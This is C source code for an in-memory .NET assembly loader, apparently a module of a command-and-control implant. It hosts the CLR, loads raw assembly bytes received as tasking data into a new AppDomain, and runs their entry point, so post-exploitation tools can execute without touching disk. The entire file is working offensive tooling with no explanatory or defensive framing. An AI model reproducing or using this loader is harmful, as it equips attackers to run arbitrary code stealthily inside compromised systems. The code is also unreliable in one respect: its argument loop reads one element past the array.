#include <InvokeAssembly.h>

GUID xCLSID_CLRMetaHost     = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

BOOL FindVersion( PVOID assembly, INT length )
{
    PCHAR assembly_c = (char*)assembly;

    CHAR v4[] = { 0x76, 0x34, 0x2E, 0x30, 0x2E, 0x33, 0x30, 0x33, 0x31, 0x39 };

    for ( INT i = 0; i < length; i++ )
    {
        for ( INT j = 0; j < 10; j++ )
        {
            if ( v4[ j ] != assembly_c[ i + j ] )
                break;
            else
            {
                if ( j == 9 )
                    return 1;
            }
        }
    }

    return 0;
}

VOID InvokeAssembly( PPARSER DataArgs )
{
    SIZE_T  AppDomainNameSize           = 0;
    SIZE_T  NetVersionSize              = 0;
    SIZE_T  assemblyBytesLen            = 0;
    SIZE_T  ArgumentsLen                = 0;

    PUCHAR  AppDomainName               = ParserGetBytes( DataArgs, &AppDomainNameSize );
    PUCHAR  NetVersion                  = ParserGetBytes( DataArgs, &NetVersionSize );
    PUCHAR  assemblyBytes               = ParserGetBytes( DataArgs, &assemblyBytesLen );
    PUCHAR  Arguments                   = ParserGetBytes( DataArgs, &ArgumentsLen );

    WCHAR   wAppDomainName[ MAX_PATH ]  = { 0 };
    WCHAR   wNetVersion[ 20 ]           = { 0 };
    PWCHAR  wArguments                  = LocalAlloc( LPTR, ArgumentsLen * sizeof( WCHAR ) );

    // CLR & .Net Instances
    ICLRMetaHost*       pClrMetaHost        = { NULL };
    ICLRRuntimeInfo*    pClrRuntimeInfo     = { NULL };
    ICorRuntimeHost*    pICorRuntimeHost    = { NULL };
    Assembly*           pAssembly           = { NULL };
    IUnknown*           pAppDomainThunk     = { NULL };
    AppDomain*          pAppDomain          = { NULL };
    MethodInfo*         pMethodInfo         = { NULL };
    VARIANT             vtPsa               = { 0 };
    LPVOID              pvData              = { NULL };

    VARIANT retVal  = { 0 };
    VARIANT obj     = { 0 };


    // Convert Ansi Strings to Wide Strings
    CharStringToWCharString( wAppDomainName, AppDomainName, AppDomainNameSize );
    CharStringToWCharString( wNetVersion, NetVersion, NetVersionSize );
    CharStringToWCharString( wArguments, Arguments, ArgumentsLen );

    if ( assemblyBytes == NULL )
        return;

    // Hosting CLR
    if ( ! W32CreateClrInstance( wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost ) )
    {
        Instance.Win32.printf( "[-] Couldn't start CLR \n" );
        return;
    }

    SAFEARRAYBOUND rgsabound[1] = { 0 };
    rgsabound[0].cElements = assemblyBytesLen;
    rgsabound[0].lLbound = 0;
    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);

    if ( pICorRuntimeHost->lpVtbl->CreateDomain( pICorRuntimeHost, wAppDomainName, NULL, &pAppDomainThunk ) != S_OK )
        goto Cleanup;

    if ( pAppDomainThunk->lpVtbl->QueryInterface( pAppDomainThunk, &xIID_AppDomain, &pAppDomain ) != S_OK )
        goto Cleanup;

    if ( SafeArrayAccessData( pSafeArray, &pvData ) != S_OK )
        goto Cleanup;

    MemCopy(pvData, assemblyBytes, assemblyBytesLen);

    if ( SafeArrayUnaccessData( pSafeArray ) != S_OK )
        Instance.Win32.printf("[-] SafeArrayUnaccessData: Failed\n");

    if ( pAppDomain->lpVtbl->Load_3( pAppDomain, pSafeArray, &pAssembly ) != S_OK )
        goto Cleanup;

    if ( pAssembly->lpVtbl->EntryPoint( pAssembly, &pMethodInfo ) != S_OK )
        goto Cleanup;

    obj.vt = VT_NULL;

    SAFEARRAY* psaStaticMethodArgs = SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

    DWORD   argumentCount;
    LPWSTR* argumentsArray = CommandLineToArgvW( wArguments, &argumentCount );

    argumentsArray++;
    argumentCount--;

    vtPsa.vt = ( VT_ARRAY | VT_BSTR );
    vtPsa.parray = SafeArrayCreateVector( VT_BSTR, 0, argumentCount );

    for ( INT i = 0; i <= argumentCount; i++ )
        SafeArrayPutElement( vtPsa.parray, &i, SysAllocString( argumentsArray[ i ] ) );

    long idx[1] = { 0 };
    SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

    if ( pMethodInfo->lpVtbl->Invoke_3( pMethodInfo, obj, psaStaticMethodArgs, &retVal ) != S_OK )
        goto Cleanup;



Cleanup:
    if ( NULL != psaStaticMethodArgs )
    {
        SafeArrayDestroy( psaStaticMethodArgs );
        psaStaticMethodArgs = NULL;
    }

    if ( pMethodInfo != NULL )
    {
        pMethodInfo->lpVtbl->Release( pMethodInfo );
        pMethodInfo = NULL;
    }

    if ( pAssembly != NULL )
    {
        pAssembly->lpVtbl->Release( pAssembly );
        pAssembly = NULL;
    }

    if (pAppDomain != NULL)
    {
        pAppDomain->lpVtbl->Release( pAppDomain );
        pAppDomain = NULL;
    }

    if ( pAppDomainThunk != NULL )
        pAppDomainThunk->lpVtbl->Release( pAppDomainThunk );

    if ( pICorRuntimeHost != NULL )
    {
        pICorRuntimeHost->lpVtbl->UnloadDomain( pICorRuntimeHost, pAppDomainThunk );
        pICorRuntimeHost->lpVtbl->Stop( pICorRuntimeHost );
        pICorRuntimeHost = NULL;
    }

    if ( pClrRuntimeInfo != NULL )
    {
        pClrRuntimeInfo->lpVtbl->Release( pClrRuntimeInfo );
        pClrRuntimeInfo = NULL;
    }

    if ( pClrMetaHost != NULL )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }
}

BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
{
    BOOL fLoadable = FALSE;

    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
    {
        if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
        {
            if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
            {
                //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, ppICorRuntimeHost ) == S_OK )
                {
                    //Start it. This is okay to call even if the CLR is already running
                    ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
                }
                else
                {
                    Instance.Win32.printf("[-] ( GetInterface ) Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                Instance.Win32.printf("[-] ( IsLoadable ) Process refusing to load %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            Instance.Win32.printf("[-] ( GetRuntime ) Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        Instance.Win32.printf("[-] ( CLRCreateInstance ) Process refusing to create %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
        return 0;
    }

    return 1;
}